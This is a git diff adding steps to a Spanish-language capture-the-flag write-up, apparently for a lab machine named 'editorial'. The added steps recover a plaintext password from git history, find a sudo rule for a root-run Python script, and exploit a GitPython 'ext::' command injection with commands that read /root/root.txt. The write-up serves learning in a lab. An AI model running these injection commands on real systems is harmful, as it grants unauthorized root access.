@@ -111,9 +111,121 @@
 
 - al ingresar podemos ver la primera flag
 
+- ingresamos a la carpeta app
+- revisamos con
+
+> ls -la
+
+- vemos una carpeta .git y ingresamos
+- vemos los logs con
+
+> git log
+
+- vemos los comentarios con
+
+> git show
+
+- revisamos cada comentario ejemplo
+
+> git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
+
+- encontramos lo siguiente
+
+----------------------------------------------------------
+'template_mail_message': 
+"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.
+\n\nYour login credentials for our internal forum and authors site are:
+\nUsername: prod
+\nPassword: 080217_Producti0n_2023!@
+\nPlease be sure to change your password as soon as possible for security purposes.
+\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.
+\n\nBest regards, " + api_editorial_name + " Team."
+----------------------------------------------------------
+
+- obtenemos otras credenciales
+
+|user|password|
+|----|--------|
+|prod|080217_Producti0n_2023!@|
+
+- vamos a home y ejecutamos lo siguiente
+
+> sudo -l
+
+- esto es para validar si tenemos algun tipo de permiso
+- encontramos que tenemos permisos para un script en python
+
+----------------------------------------------------------
+Matching Defaults entries for prod on editorial:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User prod may run the following commands on editorial:
+    (root) /usr/bin/python3
+        /opt/internal_apps/clone_changes/clone_prod_change.py *
+----------------------------------------------------------
 
 
+- revisamos el contenido del script
 
+> cat /opt/internal_apps/clone_changes/clone_prod_change.py
+
+- nos regresa lo siguiente
+
+----------------------------------------------------------
+change.py
+#!/usr/bin/python3
+
+import os
+import sys
+from git import Repo
+
+os.chdir('/opt/internal_apps/clone_changes')
+
+url_to_clone = sys.argv[1]
+
+r = Repo.init('', bare=True)
+r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
+
+----------------------------------------------------------
+
+- identificamos que se esta usando la libreria de python para git
+- buscamos alguna vulnerabilidad para esta libreria
+- y encontramos algo que nos puede servir pa explotar esta vulnerabilidad en la siguiente ruta
+
+> https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858
+
+- esta vulnerabilidad esta diponible para versiones de gitpython por debajo de la version 3.1.30
+- consultamo la version de la maquina victima
+
+> pip list | grep -i git
+
+- resultado de la version
+
+>  GitPython             3.1.29
+
+- por lo tanto es vulnerable
+- ingresamos a la siguiente ruta
+
+>  cd /opt/internal_apps/clone_changes
+
+- y ejecutamos el siguiente comando para clonar el python git
+
+> sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/pwned'
+
+- una vez que se clono realizamo un cat del archivo clonado
+
+> cat /tmp/pwned
+
+- si el resultado manda error ejecutamos el sigueinte comando para redireccionar a root y recuperar el archivo descargado
+
+> sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >% /tmp/root'
+
+- luego ejecutamos lo siguiente
+- obtenemos la flag de root
+
+# fin
 
 
 
